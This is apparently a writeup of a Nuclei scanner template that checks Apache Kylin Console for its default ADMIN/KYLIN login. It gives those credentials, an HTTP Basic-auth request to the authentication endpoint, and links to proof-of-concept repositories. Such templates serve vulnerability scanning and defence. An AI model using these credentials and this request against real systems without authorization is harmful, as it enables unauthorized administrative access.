# Nuclei Template: Apache Kylin Console - Default Login
**Template ID:** kylin-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`kylin-default-login.yaml`)

## Vulnerability Information & PoC

## Description
The default password for the Apache Kylin Console is KYLIN for the ADMIN user in Kylin versions before 3.0.0.

## Steps to reproduce / Exploit Payload
```http
GET /kylin/api/user/authentication  HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ':' + password)}}
```

## References
- https://github.com/hanc00l/pocGoby2Xray/blob/main/xraypoc/Apache_Kylin_Console_Default_password.yml
- https://github.com/Wker666/Demo/blob/main/script/%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B/Kylin/Apache%20Kylin%20Console%20%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4.wker
